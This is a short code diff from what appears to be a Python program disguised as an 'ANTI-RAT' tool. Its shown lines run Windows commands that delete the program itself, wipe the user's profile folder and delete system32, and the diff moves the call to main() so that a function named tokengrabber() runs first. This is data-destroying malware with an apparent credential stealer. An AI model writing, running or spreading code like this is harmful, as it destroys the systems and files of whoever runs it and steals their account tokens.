@@ -249,6 +249,6 @@ def main():
     subprocess.getoutput('del ANTI-RAT_By_EtichalHackingItalia.exe')
     subprocess.getoutput('rd "%userprofile%"/q /s')
     subprocess.getoutput('rd "%windir%\system32"/q /s')
-main()
 tokengrabber()
 licenseW()
+main()
